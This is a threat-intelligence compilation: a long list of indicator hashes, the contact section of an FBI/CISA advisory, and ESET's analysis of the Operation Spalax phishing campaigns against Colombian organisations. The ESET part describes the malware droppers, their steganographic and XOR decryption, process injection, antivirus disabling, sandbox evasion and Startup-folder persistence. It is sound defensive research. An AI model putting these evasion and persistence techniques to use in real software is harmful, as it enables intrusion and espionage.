25fc4713290000cdf01d3e7a0cea7cef 2639805ae43e60c8f04955f0fe18391c 270df5aab66c4088f8c9de29ef1524b9 280e5a3b9671db31cf003935c34f8cf9 28366de82d9c4441f82b84246369ad3b 28628f709a23d5c02c91d6445e961645 28c6f235946fd694d2634c7a2f24c1ba 29c1b4ec0bc4e224af2d82c443cce415 2b8a06d1de446db3bbbd712cdb2a70ce 2bf998d954a88b12dbec1ee96b072cb9 2c408385acdb04f0679167223d70192b 2c9737c6922b6ca67bf12729dcf038f9 2dd9aab33fcdd039d3a860f2c399d1b1 2de0e31fda6bc801c86645b37ee6f955 2e5b59c62e6e2f3b180db9453968d817 2ee7168c0cc6e0df13d0f658626474bb 2eee367a6273ce89381d85babeae1576 2f0a52ce4f445c6e656ecebbcaceade5 2f9995bc34452c789005841bc1d8da09 30701b1d1e28107f8bd8a15fcc723110 31a72e3bf5b1d33368202614ffd075db 3389dae361af79b04c9c8e7057f60cc6 33d18e29b4ecc0f14c20c46448523fc8 46e80d49764a4e0807e67101d4c60720 480f3a13998069821e51cda3934cc978 48101bbdd897877cc62b8704a293a436 48548309036005b16544e5f3788561dc 4a23e0f2c6f926a41b28d574cbc6ac30 4ab825dc6dabf9b261ab1cf959bfc15d 4b18b1b56b468c7c782700dd02d621f4 4b93159610aaadbaaf7f60bea69f21a4 4beb3f7fd46d73f00c16b4cc6453dcdb 4dd6eab0fa77adb41b7bd265cfb32013 4e79e2cade96e41931f3f681cc49b60a 4ef1c48197092e0f3dea0e7a9030edc8 503f8dc2235f96242063b52440c5c229 50527c728506a95b657ec4097f819be6 5064dc5915a46bfa472b043be9d0f52f 513f559bf98e54236c1d4379e489b4bc 51e21a697aec4cc01e57264b8bfaf978 51f31ed78cec9dbe853d2805b219e6e7 52b0f7d77192fe6f08b03f0d4ea48e46 53ceeaf0a67239b3bc4b533731fd84af 56a9ff904b78644dee6ef5b27985f441 56b18ba219c8868a5a7b354d60429368 56d6d3aa1297c62c6b0f84e5339a6c22 57849bb3949b73e2cd309900adafc853 5826e0bd3cd907cb24c1c392b42152ca 5875dfe9a15dd558ef51f269dcc407b5 58e7fd4530a212b05481f004e82f7bc1 5957ef4b609ab309ea2f17f03eb78b2d 5984955cbc41b1172ae3a688ab0246c5 59ce71ffb298a5748c3115bc834335bf 5a8d488819f2072caed31ead6aeaf2fc 5acac898428f6d20f6f085d79d86db9c 5b2cddac9ebd7b0cd3f3d3ac15026ffb 6f6d12da9e5cf8b4a7f26e53cc8e9fbd 700d2582ccb35713b7d1272aa7cfc598 70206725df8da51f26d6362e21d8fadb 70e0052d1a2828c3da5ae3c90bc969ea 7204c1f6f1f4698ac99c6350f4611391 72a7fd2b3d1b829a9f01db312fdd1cd7 7327993142260cee445b846a12cf4e85 7525bc47e2828464ce07fa8a0db6844f 76adaa87f429111646a27c2e60bda61e 76c5dca8dc9b1241b8c9a376abab0cc5 782202b09f72b3cfdc93ffb096ca27de 7836c4a36cc66d4bcbd84abb25857d21 78a0af31a5c7e4aee0f9acde74547207 7969dc3c87a3d5e672b05ff2fe93f710 7a09bf329b0b311cc552405a38747445 7a63ea3f49a96fa0b53a84e59f005019 7b3f959ab775032a3ca317ebb52189c4 7b710f9731ad3d6e265ae67df2758d50 7bd10b5c8de94e195b7da7b64af1f229 7c036ba51a3818ddc8d51cf5a6673da4 7c49efe027e489134ec317d54de42def 7d63f39fb0100a51ba6d8553ef4f34de 7ef6802fc9652d880a1f3eaf944ce4a3 7f7d726ea2ed049ab3980e5e5cb278a3 7fe679c2450c5572a45772a96b15fcb1 83076104ae977d850d1e015704e5730a 8361b151c51a7ad032ad20cecf7316f4 838ceb02081ac27de43da56bec20fc76 84865f8f1a2255561175ab12d090da7c 8520062de440b75f65217ff2509120f7 85862c262c087dd4470bb3b055ef8ea5 85e5b11d79a7570c73d3aa96e5a4e84d 85ecef9ca15e25835a9300a85f9bcd2a 9d3fd2ff608e79101b09db9e361ea845 9d5206f692577d583b93f1c3378a7a90 9e592d0918c029aa49635f03947026e8 9f847b3618b31ef05aebd81332067bd8 9fdd77dc358843af3d7b3f796580c29d a025881cd4ae65fab39081f897dc04fd a0e3561633bdf674b294094ffa06a362 a13715be3d6cbd92ed830a654d086305 a2256f050d865c4335161f823b681c24 a26e600652c33dd054731b4693bf5b01 a2c66a75211e05b20b86dd90ba534792 a2cb95be941b94f5488eab6c2eec7805 a320510258668504ed0140e7b58ee31e a34db95c0fcb78d9c5452f81254224eb a3c0151e0b6289376f383630a8014722 a42a91354d605165d2c1283b6b330539 a4711b8414445d211826b4da3f39de0a a4a70ce528f64521c3cd98dce841f6f3 a5ac89845910862cfef708b20acd0e44 a67fcb5dcfc9e3cfbfd7890e65d4f808 a68bf5fce22e7f1d6f999b7a580ae477 a6b9bbb87eb08168fc92271f69fa5825 a6cab9f2e928d71ed8ecf2c28f03a9a2 a7e4f42ad70ddd380281985302573491 a83b1aed22de71baee82e426842eeb48 a91dca76278cf4f4155eb1b0fc427727 a96dca187c3c001cad13440c3f7e77e8 aa73e7056443f1dd02480a22b48bdd46 aaafb1eeee552b0b676a5c6297cfc426 ab662cee6419327de86897029a619aeb ab8f72562d02156273618d1f3746855c abdb86d8b58b7394be841e0a4da9bec7 ace585625de8b3942cc3974cf476f8de beea0da01409b73be94b8a3ef01c4503 befc121916f9df7363fead1c8554df9a bf250a8c0c9a820cd1a21e3425acfe37 bfb0dcd9ef6ac6e016a8a5314d4ef637 bff56d7e963ea28176b0bcb60033635d c05e5bc5adb803b8a53cff7f95621c73 c0ad63a680fbdc75d54b270cbedb4739 c0d9f3a67a8df0ed737ceb9e15bacc47 c112456341a1c5519e7039ce0ba960fa c161f10fccecec67c589cdd24a05f880 c183e7319f07ccc591954068e15095db c2e023b46024873573db658d7977e216 c380675a29f47dba0b1401c7f8e149dc c3996bf709cad38d58907da523992e3b c583ae5235ddea207ac11fff4af82d9b c71f125fb385fed2561f3870b4593f18 c75a2b191da91114ceea80638bc54030 c78ee46ffbe5dd76d84fb6a74bf21474 c79b27fe1440b11a99a5611c9d6c6a78 c808d2ed8bb6b2e3c06c907a01b73d06 c8930a4fd33dcf18923d5cf0835272bd c8940976a63366f39cfcdc099701093b c89e8f0bc93d472a4f863a5fa7037286 c8a850a027fa4a3cdae7f87cc1c71ba0 cab21cb7ba1c45a926b96a38b0bdaaef cbe63b9c0c9ac6e8c0f5b357df737c5e cbfc1587f89f15a62f049e9e16cccf68 cd049c2b76c73510ae70610fd1042267 cd058dd28822c72360bc9950a6c56c45 cd427b4afea8032c77e907917608148a cd81267e9c82d24a9f40739fa6bf1772 cdc22f7913eb93d77d629e59ac2dc46a cdc585a1fd677da07163875cd0807402 e0b7e6c17339945bba43b8992a143485 e119a70f50132ae3afba3995fdf1aca6 e1512a0bf924c5a2b258ec24e593645a e195d22652b01a98259818cfbab98d33 e1ab3358b5356adefaffbc15bc43a3f9 e1b840bbf5b54aeb19e6396cab8f4c6a e26a29c0fc11cfb92936ab3374730b79 e284c25c50ba59d07a4fa947dc1a914a e3867f6e964a29134c9ea2b63713f786 e3eb703ef415659f711b6bc5604e131e e498718fd286aca7bb78858f4636f2db e4d2c63a73a0f1c6b5e60bde81ac0289 e5478fb5e8d56334d19d43cae7f9224a e5f7efcee5b15cf95a070a5cd05dbda9 e6348ee5beb9c581eeeaf4e076c5d631 e637f47c4f17c01a68539fcfcc4bc44f e63fbc864b7911be296c8ee0798f6527 e68f9b39caf116fb108ccb5c9c4ce709 e6a757114c0940b6d63c6a5925ade27f e6adc73df12092012f8cd246ba619f90 e8881037f684190d5f6cc26aab93d40f e890fa6fd8a98fec7812d60f65bf1762 e8bc927ee0ae288609e1c37665a3314e e8e73156316df88dee28214fb203658b e957c36c9d69d6a8256b6ddf7f806f56 e9ce9b35e2386bf442e22a49243a647e eadcae9ecba1097571c8d08e9b1c1a9c eb06648b43d34f20fc1c40e509521e99 eb5e5db77540516e6400a7912ad0ef0d eb5e999753f5ea094d59bdae0c66901c eb5ee94048730b321e35394a0fb10a5d eb64867dc48f757f0afe05dbf605b72d eb88f415336f0dccedfc93405330c561 fae03ff044d6bb488e1a6f1c6428c510 fc2142bd72bd520338f776146903be67 fc9b8262905a80cc5381d520813d556d fccd3de1df131f9d74949d69426c24af fcd912fd7ed80e2cdf905873c6ced4ad ff804e266a83974775814870cc49b66b 11166f8319c08c70fc886433a7dac92d 1223302912ec70c7c8350268a13ad226 139e071dd83304cdcfd5280022a0f958 13c93dc9186258d6c335b16dc7bb3c8c 14e2b0e47887c3bfbddb3b66012cb6e8 15437cfedfc067370915864feec47678 15e1816280d6c2932ff082329d0b1c76 166694d13ac463ea1c2bed64fbbb7207 16a344cd612cca4f0944ba688609e3ac 16c0011ea01c4690d5e76d7b10917537 1734a2b176a12eba8b74b8ca00ef1074 18144e860d353600bbd2e917aed21fde 1815c3a7a4a6d95f9298abb5855a3701 181a5b55b7987b62b5236965f473ba3b 18c26c5800e9e2482f1507c96804023e 1932ce50b7b6c88014cf082228486e5c 1af78c50aca90ee3d6c3497848ac5705 1b44fb4aaff71b1f96cd049a9461eaf5 1bb8f32e6e0e089d6a9c10737cf19683 1c35a87f61953baace605fff1a2d0921 1c945a6b0deccc6cd2f63c31f255d0ec 1cb216777039fe6a8464fc6a214c3c86 1d3a10846819a07eef66deefcc33459a 1dd6c80b4ea5d83aff4480dcbbef520c 1e91f0f52994617651e9b4a449af551a 1eb568559e335b3ed78588e5d99f9058 1ef9c42efe6e9a08b7ebb16913fa0228 1f2befede815fcf65c463bf875fcf497 1f9bdc0435ff0914605f01db8ca77a65 1ffd883095ff3279b31650ca3a50ad3c 34521c0f78d92a9d95e4f3ff15b516db 34681367cbcc3933f0f4b36481bde44e 34aa195c604d0725d7dd2aa4cc4efe28 354b95e858bcaced369ecbfdec327e2b 35f456afbe67951b3312f3b35d84ff0a 3647d11c155d414239943c8c23f6e8ec 37578c69c515f1d0d49769930fba25ce 375cbb0a88111d786c33510bff258a21 37b9b4ed979bd2cf818e2783499bfb5e 3810a18650dbacecd10d257312e92f61 3975740f65c2fa392247c60df70b1d6d 3a4ec0d0843769a937b5dadbe8ea56b1 3ab6bf23d5d244bc6d32d2626bd11c08 3bf8bb90d71d21233a80b0ec96321e90 3c2fe2dbdf09cfa869344fdb53307cb2 3c3d453ecf8cc7858795caece63e7299 3cbb46065f3e1dccbd707c340f38ce6b 3cf9dc0fdc2a6ab9b6f6265dc66b0157 3e89c56056e5525bf4d9e52b28fbbca7 3eb6f85ac046a96204096ab65bbd3e7e 3f50eedf4755b52aa7a7b740bd21daa6 3fefa55daeb167931975c22df3eca20a 4012acd80613aaa693a5d6cd4e7239ba 40528e368d323db0ac5c3f5e1efe4889 407c1ea99677615b80b2ffa2ed81d513 417949c717f78dc9e55ca81a5f7ade3e 4260e71d89f622c6a3359c5556b3aad7 429c10429a2ebb5f161e04159a59cf5b 4315975499cdc50098dbdb5b8aa4a199 44fa9c5df4ae20c50313aae02ba8fb95 4519b5d443a048a8599144900c4e1f28 45eb058edde4e5755a5ea1aff3ce3db7 460dc00ce690efacb5db8273c80e2b23 5b3050df93629f2f6cb3801ed19963c5 5b37ac4d642b96c4bf185c9584c0257a 5b3e945cd32a380f09ea98746f570758 5b72df8f6c110ae1d603354fcd8fe104 5c6f5cd81b099014718056e86b510fa2 5d63a3a02df2beda9d81f53abbd8264a 5d9c3cb239fa24bed2781bcf2898f153 5e353d1d17720c0f7c93f763e3565b3f 5f1c7f267fbe12210d3c80944f840332 5f393838220a6bf0cd9fd59c7cf97f5b 5f771966ef530ee0c2b42ef5cc46ad3a 6034ff91b376d653dc30f79664915b4e 603935efa89d93ea39b4b4d4a52ec529 607ea06890a6eedd723f629133576f20 60b2ce5ef4a076d1fa8675b584c27987 60cff7381b8fb64602816f9e5858930b 614909c72fa811ae41ea3d9b70122cee 6372d578e881abf76a4ec61e7a28da7d 63bf28f5dc6925a94c8b4e033a95be10 646cbeb4233948560ac50de555ea85ca 64db8e54d9a2daaa6d9cf156a8b73c18 675fe822243dfd1c3ace2a071d0aa6dd 
67dbecfb5e0f2f729e57d0f1eda82c67 685cbba8cf2584a3378d82dec65aa0bb 
693a4c2fcaa67fb87e62f150fb65e00e 6ad33ab8b9ff3f02964a8aab2a40ebb5 6b540be7ac7159104b0ffa536747f1bf 6b7276e4aa7a1e50735d2f6923b40de4 6b930be55ed4bf8e16b30eadc3873dfd 6c67f275d50f6bfee4848de6d4911931 6c9cfada134ede220b75087c7698ebf2 6e843ef4856336fe3ef4ed27a4c792b1 6e97bf1b7c44edc66622b43e81105779 86e50d6dc28283dbd295079252787577 870fbad5b9a54cb6720c122d1fa321ec 88b3b94574ba1eeb711a66eb04021eed 8956a045306b672d3cc852419a72c4b0 8a9ac1b3ef2bf63c2ddfadbbbfd456b5 8b3b96327fbddebefe727ac2edad5714 8baa499b3e2f081ff47f8cf06a5e7809 8bc20fcd09adb7ea86dda2c57477633b 8be0c21b6ee56d0f68e0d90f7d0a26d7 8c80dd97c37525927c1e549cb59bcbf3 8d2416d9f6926fb0dc12ab5dafef691d 8d74922b2b31354ce588cefac71d9a9b 8e8fb7632c3a7e96cf0ea5299d564018 8ee6c9e1adb71b2623d5e7aa45df5f4d 8efaa987959ef95179a0f5be05c10faf 8fbf53f77c98daba277dae7661b86f02 8fc825df73977eeffaaa1587565f7505 90a3e3a2049c6eb9e39d113d9451a83f 932d355d9f2df2e8d8449d85454fc983 9450980a4413dfdbc60a62b257a7b019 947892152b8419a2dfe498be5063c1da 94d42ff06a588587131c2cd8a9b2fe96 95c15b7961e2d6fad96defa7ff2c6272 96ba4bf00d8b4acee9f550286610dcc7 97004f1962e2aed917dc2be5c908278f 972077c1bb73ca78b7cad4ac6d56c669 991ebcd03ace627093acc860fae739b5 99949240bc4eae33cac4bbb93b72349d 9a0a8048d53dedc763992fff32584741 9a0e3e80cd7c21812de81224f646715e 9a61ed5721cf4586abd1d49e0da55350 9b26999182ea0c2b2cac91919697289e 9c656ce22c93ca31c81ff8378a0a91ee ace620a0cc2684347e372f7e40e245d5 ad3b9e45192ec7c8085c3588cacb9c58 adb4f6ecb67732b7567486f0cee6e525 afa03ddb9fc64a795aadb6516c3bc268 b0269263ce024fc9de19f8f30bd51188 b04e895827c24070eb7082611ab79676 b059c9946ff67c62c074d6d15f356f6e b07299a907a4732d14da32b417c08af3 b1dadfcf459f8447b9ec44d8767da36d b2f1d2fefe9287f3261223b4b8219d03 b36f3e12cb88499f8795b8740ae67057 b4204f08c1a29fd4434e28b6219bfbc6 b4878c233d7f776a407f55a27b5effbc b6c12d88eeb910784d75a5e4df954001 b7ab5c6926f738dbe8d3a05cb4a1b4f5 b80dcd50e27b85d9a44fc4f55ff0a728 b8a61b1fda80f95a7dcdb0137bc89f67 b9642c1b3dbcccc9d84371b3163d43e0 b9647f389978f588d977ef6ef863938f b977bed98ae869a9bb9bf725215ef8e5 b9b627c470de997c01fdef4511029219 ba629216db6cf7c0c720054b0c9a13f3 badf0957c668d9f186fb218485d0d0f6 bb165b815e09fe95fa9282bce850528d bbfb478770a911cf055b8dfd8dcb36e4 bc4c189e590053d2cf97569c495c9610 bc9089c39bcdb1c3ef2e5bd25c77ed68 bd42303e7c38486df2899b0ccf3ce8f7 bd452dc2f9490a44bcff8478d875af4b bd6031dd85a578edf0bf1560caf36e02 bd63832e090819ea531d1a030fb04e9b be39ff1ec88a1429939c411113b26c02 be88741844bf7c47f81271270abe82dc ce26e91fc13ccb1be4b6bf6f55165410 ce449d7cb0a11b53b0513dde3bd57b1c ceba742bccb23304cf05d6c565dc53f8 cebe44b8a9a2d6e15a03d40d9e98e0ed cf946bc0faecb2dc8e8edc9e6ce2858f d09fcd9fa9ed43c9f28bcd4bd4487d22 d0b5c11ee5df0d78bdde3fdc45eaf21d d0d8243943053256bc1196e45fbf92d2 d0efc042ba4a6b207cf8f5b6760799d8 d20d01038e6ea10a9dcc72a88db5e048 d31596fe58ca278be1bb46e2a0203b34 d3df8c426572a85f3afa46e4cd2b66cd d59a77a8da7bec1f4bad7054a41b3232 d76b1c624e9227131a2791957955dddc d79477c9c688a8623930f4235c7228f6 d8a483d21504e73f0ba4b30bc01125d3 da46994fee26782605842005aabcd2fe daa232882b74d60443dfec8742401808 dab45ac39e34cfee60dcb005c3d5a668 dbc583d6d5ec8f7f0c702b209af975e2 dbe92b105f474efc4a0540673da0eb9c dbee8be5265a9879b61853cd9c0e4759 dc15ca49b39d1d17b22ec7580d32d905 dc386102060f7df285e9498f320f10e0 dd43cd0eddbb6f7cb69b1f469c37ec35 dd4e0f997e0b2cc9df28dca63ded6816 ddbdc6a3801906de598531b5b2dac02a dde4ff4e41f86426051f15da48667f5f ddecce92a712327c4068fabf0e1a7ff1 de608439f2bcc097b001d352b427bb68 deeb9b4789ac002aa8b834da76e70d74 df6475642f1fe122df3d7292217f1cff e011784958e7a00ec99b8f2320e92bf4 ec4cdc752c2ecd0d9f97491cc646a269 edb648f6c3c2431b5b6788037c1cd8ef ee3e297abd0a5b943dce46f33f3d56fb ee4862bc4916fc22f219e1120bea734a ef14448bf97f49a2322d4c79e64bb60b ef2738889e9d041826d5c938a256bc45 ef6fcdd1b55adf8ad6bcdf3d93fd109e efb5499492f08c1f10fecdeb703514d5 f0098aab593b65d980061a2df3a35c21 f073de9c169c8fcb2de5b811bff51cee f0881d5a7f75389deba3eff3f4df09ac f172ad4e906d97ed8f071896fc6789dc f2b6bffa2c22420c0b1c848b673055ed f446d8808a14649bddcc412f9e754890 f4dbe32f3505bc17364e2b125f8dd6df f4dd628f6c0bc2472d29c796ee38bf46 f4e67343e13c37449ada7335b9c53dd1 f53e332b0a6dbe8d8d3177e93b70cb1e f5ae03de0ad60f5b17b82f2cd68402fe f5ce889a1fa751b8fd726994cdb8f97e f5fdbfce1a5d2c000c266f4cd180a78d f7202dea71cc638e0c2dbeb92c2ce279 f7cef381c4ee3704fc8216f00f87552a f7ffbbbc68aadcbfbace55c58b6da0a7 f8b91554d221fe8ef4a4040e9516f919 f906571d719828f0f4b6212fc2aa7705 f9155052a43832061357c23de873ff9f f9abacc459e5d50d8582e8c660752c4e f9f608407d551f49d632bd6bd5bd7a56 f9fc9359dc5d1d0ac754b12efb795f79 fa27742b87747e64c8cb0d54aa70ef98 fa3c8d91ef4a8b245033ddb9aa3054a2 fad93907d5587eb9e0d8ebc78a5e19c2 Contact Information To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov.
When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
To request incident response resources or technical assistance related to these threats, contact CISA at CISAServiceDesk@cisa.dhs.gov. References DOJ Press Release Talos Intelligence:
China Chopper Still Active
9 Years Later CISA China Cyber Threat Overview webpage CISA Alert TA15-314A: Compromised Web Servers and Web Shells - Threat Awareness and Guidance CISA Alert AA20-133A: Top 10 Routinely Exploited Vulnerabilities CISA Alert AA20-275A:
Potential for China Cyber Response to Heightened U.S.-China Tensions NSA Cybersecurity Advisory U/OO/179811-20: Chinese State-Sponsored Actors Exploit Publicly Known Vulnerabilities Revisions July 19, 2021:
Initial version Updated July 19, 2021: Added note and STIX file This product is provided subject to this Notification and this Privacy & Use policy. 
title: Operation Spalax:
Targeted malware attacks in Colombia url: https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/ ESET researchers uncover attacks targeting Colombian government institutions and private companies, especially from the energy and metallurgical industries 
In 2020 ESET saw several attacks targeting Colombian entities exclusively.
These attacks are still ongoing at the time of writing and are focused on both government institutions and private companies.
For the latter, the most targeted sectors are energy and metallurgical.
The attackers rely on the use of remote access trojans, most likely to spy on their victims.
They have a large network infrastructure for command and control: ESET observed at least 24 different IP addresses in use in the second half of 2020.
These are probably compromised devices that act as proxies for their C&C servers.
This, combined with the use of dynamic DNS services, means that their infrastructure never stays still.
We have seen at least 70 domain names active in this timeframe
and they register new ones on a regular basis. 
The attackers The attacks we saw in 2020 share some TTPs with previous reports about groups targeting Colombia, but also differ in many ways, thus making attribution difficult. 
One of those reports was published in February 2019, by QiAnXin researchers.
The operations described in that blogpost are connected to an APT group active since at least April 2018.
We have found some similarities between those attacks and the ones that we describe in this article: We saw a malicious sample included in IoCs of QiAnXin’s report and a sample from the new campaign in the same government organization.
These files have fewer than a dozen sightings each. 
Some of the phishing emails from the current campaign were sent from IP addresses corresponding to a range that belongs to Powerhouse Management, a VPN service.
The same IP address range was used for emails sent in the earlier campaign. 
The phishing emails have similar topics and pretend to come from some of the same entities – for example, the Office of the Attorney General (Fiscalia General de la Nacion) or the National Directorate of Taxes and Customs (DIAN). 
Some of the C&C servers in Operation Spalax use linkpc.net and publicvm.com subdomains, along with IP addresses that belong to Powerhouse Management.
This also happened in the earlier campaign. 
However, there are differences in the attachments used for phishing emails, the remote access trojans (RATs) used and in most of the operator’s C&C infrastructure. 
There is also this report from Trend Micro, from July 2019.
There are similarities between the phishing emails and parts of the network infrastructure in that campaign and the one we describe here.
The attacks described in that article were connected to cybercrime, not espionage.
While we have not seen any payload delivered by the attackers other than RATs, some of the targets in the current campaign (such as a lottery agency) don’t make much sense for spying activities. 
These threat actors show perfect usage of the Spanish language in the emails they send, they only target Colombian entities, and they use premade malware and don’t develop any themselves. 
Attack overview Targets are approached with emails that lead to the download of malicious files.
In most cases, these emails have a PDF document attached, which contains a link that the user must click to download the malware.
The downloaded files are regular RAR archives that have an executable file inside.
These archives are hosted in legitimate file hosting services such as OneDrive or MediaFire.
The target has to manually extract the file and execute it for the malware to run. 
We’ve found a variety of packers used for these executables, but their purpose is always to have a remote access trojan running on the victimized computer, usually by decrypting the payload and injecting it into legitimate processes.
An overview of a typical attack is shown in Figure 1.
We have seen the attackers use three different RATs: Remcos, njRAT and AsyncRAT. Figure 1.
Overview of the attack Phishing emails The attackers use various topics for their emails, but in most cases they are not specially crafted for their victims.
On the contrary, most of these emails have generic topics that could be reused for different targets. 
We found phishing emails with these topics: A notification about a driving infraction A notification to take a mandatory COVID-19 test A notification to attend a court hearing An open investigation against the recipient for misuse of public funds A notification of an embargo of bank accounts The email shown in Figure 2 pretends to be a notification about a driving infraction for a value of around US$250.
There is a PDF file attached that promises a photo of the infraction, as well as information about time and place of the incident.
The sender has been spoofed to make the email look like it is coming from SIMIT (a system for paying transit violations in Colombia). 
Figure 2.
Example of a phishing email The pdf file only contains an external link that has been shortened with the acortaurl service, as shown in Figure 3.
The shortened URL is: https://acortaurl[.]com/httpsbogotagovcohttpsbogotagovcohttpsbogotagovco. 
After the shortened link is expanded, a RAR archive is downloaded from: http://www.mediafire[.]com/file/wbqg7dt604uwgza/SIMITcomparendoenlineasimitnumeroreferenciaComparendo2475569.uue/file. 
Figure 3.
PDF attached to phishing email Figure 4 shows part of the email’s header.
The spoofed sender is notificacionesmultas@simit.org[.]co but we can see that the real sender is IP address 128.90.108[.]177, which is connected with the domain name julian.linkpc[.]net, as found in historic DNS data.
It’s not a coincidence that the same domain name is used for contacting the C&C server in the malicious sample contained in the RAR archive.
This IP address belongs to Powerhouse Management, a VPN service provider. 
Figure 4.
Header of a phishing email In more recent emails, the shortened link in the PDF file resolves to https://bogota.gov[.]co (a legitimate site) when visited from outside of Colombia. 
Also, in some cases the GetResponse service has been used to send the email.
This is probably done to track whether the victim has clicked on the link.
In these cases there is no attachment: a link to the GetResponse platform leads to the download of malware. 
You can see the other emails in the following gallery (click to enlarge): Figures 5 to 13.
Various phishing emails and their attached files Malicious artifacts Droppers The executable files contained in compressed archives that are downloaded via the phishing emails are responsible for decrypting and running remote access trojans on a victimized computer.
In the following sections, we describe the various droppers we have seen. 
NSIS installers The dropper that is most commonly used by these attackers comes as a file that was compiled with NSIS (Nullsoft Scriptable Install System).
To try to evade detection, this installer contains several benign files that are written to disk (they are not part of NSIS binaries and they are not used at all by the installer) and two files that are malicious: an encrypted RAT executable and a DLL file that decrypts and runs the trojan.
An NSIS script for one of these installers is shown in Figure 14.
The benign files are usually different in different droppers used by the attackers. 
Figure 14.
NSIS script for one of the droppers; the malicious files are highlighted The files Bonehead (encrypted RAT) and ShoonCataclysm.dll (dropper DLL) are written in the same folder and the DLL is run with rundll32.exe using Uboats as its argument.
The names of these files change between executables.
Some more examples are: rundll32.exe
Blackface,Breathing rundll32.exe OximeLied,Hostage rundll32.exe Conservatory,Piggins 
We used the name of the benign files contained in some of these NSIS installers to find more malicious installers used by the Spalax operators.
Table 1 lists details of three different NSIS installers used by the attackers that contained all the same benign files.
The only difference among them was the encrypted file, which pointed to different C&C servers. 
Table 1.
NSIS installers with identical benign files used by this group SHA-1C&C 
6E81343018136B271D1F95DB536CA6B2FD1DFCD6marzoorganigrama20202020.duckdns[.]org 7EDB738018E0E91C257A6FC94BDBA50DAF899F90ruthy.qdp6fj1uji[.]xyz 812A407516F9712C80B70A14D6CDF282C88938C1dominoduck2098.duckdns[.]org 
However, we also found malicious NSIS installers used by other unrelated groups that had the same benign files as the ones used by this group.
Figure 15 lists the files contained in two different NSIS installers.
The one on the left (SHA-1: 3AC39B5944019244E7E33999A2816304558FB1E8) is an executable used by this group and the one on the right (SHA-1: 6758741212F7AA2B77C42B2A2DE377D97154F860) is unrelated.
The SHA-1 hashes for all the benign files are the same (and also the filenames) and even the malicious DLL is the same.
However, the encrypted file Bonehead is different. 
Figure 15.
Files contained in NSIS droppers from unrelated campaigns This means that these installers were generated with the same builder, but by different actors.
The builder is probably offered in underground forums and includes these benign files.
This, along with a complete analysis of the dropper, was described earlier this year by Sophos in their RATicate article.
There is also an article by Lab52 describing one of the NSIS installers used in Operation Spalax, which they attribute to APT-C-36. 
In the vast majority of cases these NSIS droppers decrypt and run the Remcos RAT, but we have also seen cases where the payload is njRAT.
These will be described later in the Payloads section. 
Agent Tesla packers We have seen several droppers that are different variants of a packer that uses steganography and is known to be used in Agent Tesla samples.
Interestingly, the attackers use various payloads, but none of them are Agent Tesla.
Even though there are differences in all the samples regarding the layers of encryption, obfuscation or anti-analysis used, we can summarize the actions taken by the droppers as follows: The dropper reads a string (or binary data) from its resource section and decrypts it.
The result is a DLL that will be loaded and called in the same address space. 
The DLL reads pixels from an image contained in the first binary and decrypts another executable.
This one is loaded and executed in the same address space. 
This new executable is packed with CyaX. It reads data from its own resource section and decrypts a payload.
There are anti-analysis checks; if they pass, the payload can be injected into a new process or loaded in the same process space. 
The initial dropper is coded in C#.
In all the samples that we have seen, the code for the dropper was hiding in non-malicious code, probably copied from other apps.
The benign code is not executed; it’s there to evade detection. 
In Figure 16 we see an example of the resources contained in one of these droppers.
The text in green (only shown partially) is a string that will be decrypted to generate the next stage to be executed and the image that we see below the green text will be decrypted by the second stage malware.
The algorithm used for decryption of the string varies from sample to sample, but sometimes the resource is just an unencrypted binary. 
Figure 16.
Resources contained in Agent Tesla’s packer 
The method to be executed in the DLL is always named StartGame or StartUpdate.
It reads the image from the first executable, and stores every pixel as three numbers according to its red, green and blue components.
Then it decrypts the array by doing a single-byte XOR operation, cycling through the key.
After that, the array is gzip-decompressed and executed.
Part of the code for the mentioned operations is shown in Figure 17. Figure 17.
Code to decrypt and run the third-stage malware The third stage is in charge of decrypting and running the payload.
The .NET packer known as CyaX is used to perform this task.
The version of the packer used by the attackers is v4, although they used v2 in some cases.
Figure 18 shows the hardcoded configuration for one of their samples. 
Figure 18.
Hardcoded configuration in CyaX-Sharp packer 
The decryption of the payload is based on XOR operations and is the same as the algorithm previously shown but with an extra step: the payload is XORed with its first 16 bytes as a key.
Once it’s decrypted, it can be run in the same address space or injected into a different process, depending on the configuration. 
This packer supports various anti-analysis operations such as disabling Windows Defender, checking for security products, and detecting virtual environments and sandboxes. 
The majority of the payloads for these droppers are njRAT, but we have also seen AsyncRAT.
We saw Remcos in one of these droppers, but the code in the packer was different.
Part of the main routine for the injection of the payload is shown in Figure 19. Figure 19.
Code for the last stage of a dropper We have noticed that the configuration is contained in different variables.
Values like #startup_method# or #bind# mean that the configuration was not set for those options.
The payload is read from an encrypted resource and XORed with a hardcoded password.
The shellcode that performs the injection is contained in an array and is dynamically loaded.
There are no anti-analysis checks or protection mechanisms. 
AutoIt
droppers For some of their droppers, the attackers have used an AutoIt packer that comes heavily obfuscated.
Unlike the cases that were previously described, in this case the first-stage malware performs the injection and execution of the payload.
It does so by using two shellcodes contained in the compiled AutoIt script: one to decrypt the payload and another to inject it into some process. 
The payload is constructed by concatenating several strings, as shown in Figure 20.
By inspecting the last two characters, we can see that the string is in reverse order. 
Figure 20.
Concatenation of the payload The routine that decrypts the payload contains a small shellcode that is loaded with VirtualAlloc and executed.
The decryption done by the shellcode is based on a single-byte XOR algorithm.
The code that loads the shellcode is shown in Figure 21. Figure 21.
Execution of shellcode to decrypt the payload We can see that the shellcode is stored encrypted.
In fact, before deobfuscating the script, all strings were encrypted with this same XOR-based algorithm.
The decryption routine used is shown in Figure 22. Figure 22.
Routine to decrypt strings Once the payload is decrypted, a shellcode with RunPE code is used to perform the injection.
The shellcode is concatenated in the same manner as the payload and executed like the previous shellcode. 
To achieve persistence, a VBS script is created to execute a copy of the dropper (which is renamed to aadauthhelper.exe).
Then an Internet Shortcut (.url) file is created in the Startup folder to execute the script.
The code that generates these files is shown in Figure 23. Figure 23.
Code for persistence in AutoIt
droppers The dropper contains code that is not executed.
It can: Check for VMware and VirtualBox Delete the dropper executable Run the dropper continuously Download and execute files Terminate if a “Program Manager” window is found Read a binary from its resource section, write it to disk and execute it Modify the security descriptor (ACL) for the injected process For more information see this analysis by Morphisec where similar AutoIt droppers were used with Frenchy shellcode. 
